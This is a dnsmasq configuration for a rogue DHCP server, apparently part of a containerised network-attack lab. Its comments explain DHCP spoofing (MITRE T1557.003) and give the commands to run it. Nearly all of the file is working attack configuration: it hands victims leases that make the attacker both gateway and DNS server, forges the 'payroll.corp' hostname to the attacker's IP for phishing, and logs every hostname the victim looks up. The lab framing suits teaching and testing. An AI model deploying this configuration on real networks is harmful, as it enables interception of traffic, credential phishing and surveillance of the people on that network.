# ============================================================================
#  ROGUE DHCP SERVER  --  attacker container (172.30.0.66)
#  MITRE ATT&CK: T1557.003 (DHCP Spoofing) -> enables T1040 (Network Sniffing)
# ============================================================================
#  THE IDEA: DHCP is a race. When the victim broadcasts "DHCPDISCOVER", every
#  DHCP server on the segment may answer. The victim takes the FIRST valid
#  DHCPOFFER it receives. If the attacker answers faster (or the real server
#  is busy), the victim accepts the attacker's lease — including a GATEWAY and
#  DNS server that both point at the attacker. Instant MITM, no ARP spoofing.
#
#  Run it (inside the attacker container):
#     docker compose exec attacker \
#        dnsmasq --no-daemon --log-dhcp --conf-file=/lab/attack/rogue_dhcp/dnsmasq.conf
#
#  Force the victim to re-request a lease so the attack lands immediately:
#     docker compose exec victim dhclient -v eth0
# ============================================================================

# Only serve DHCP on the lab interface; never touch anything else.
interface=eth0
bind-interfaces

# DNS HIJACK: we ACT as the victim's DNS (option 6 points clients here) and we
# FORGE answers. This is the power DHCP spoofing has that ARP poisoning doesn't.
#   log-queries  -> every hostname the victim looks up shows in our log/feed
#                   (a map of everything they do).
#   address=...  -> forge the internal payroll hostname to the attacker's IP, so
#                   the victim is redirected to OUR fake page (phishing/pharming).
log-queries
address=/payroll.corp/172.30.0.66

# Log every DHCP step so you can screenshot DISCOVER/OFFER/REQUEST/ACK.
log-dhcp

# --- The malicious lease ----------------------------------------------------
# Hand out addresses in a range the real server (.100-.150) also uses. A short
# 2-minute lease means the victim re-asks often = attack re-lands fast in a demo.
dhcp-range=172.30.0.120,172.30.0.140,2m

# Option 3 = DEFAULT GATEWAY. We set it to the ATTACKER (172.30.0.66), so all
# of the victim's off-subnet traffic is routed straight through us.
dhcp-option=3,172.30.0.66

# Option 6 = DNS SERVER. Also the attacker. Now we can forge DNS answers and
# redirect the victim to phishing/sinkhole hosts.
dhcp-option=6,172.30.0.66

# Win the race: reply immediately, don't wait/throttle.
dhcp-authoritative
